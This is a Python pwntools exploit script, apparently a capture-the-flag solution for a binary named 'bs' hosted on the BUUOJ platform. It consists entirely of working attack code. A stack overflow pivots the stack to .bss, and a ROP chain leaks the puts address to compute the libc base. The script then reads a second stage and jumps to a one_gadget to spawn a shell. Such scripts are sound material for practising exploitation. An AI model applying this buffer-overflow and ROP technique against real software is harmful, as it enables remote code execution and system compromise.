
from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './bs'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',28529) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
bss = elf.bss()
pop_rdi = 0x400c03
pop_rsi = 0x400c01
leave_ret = 0x400955
libc = ELF('./libc-2.27.so')

payload = flat('\x00'*0x1010,bss-0x8,pop_rdi,elf.got['puts'],elf.plt['puts'],pop_rdi,0,pop_rsi,bss,0,elf.plt['read'],leave_ret).ljust(0x2000,'\x00')

sla('send?\n',str(0x2000))
s(payload)
ru('goodbye.\n')
base = uu64(r(6)) - libc.sym['puts']
leak('base',base)
one = [0x4f2c5,0x4f322,0x10a38c] # remote libc is 2.27
s(p64(base+one[1]))
# end

itr()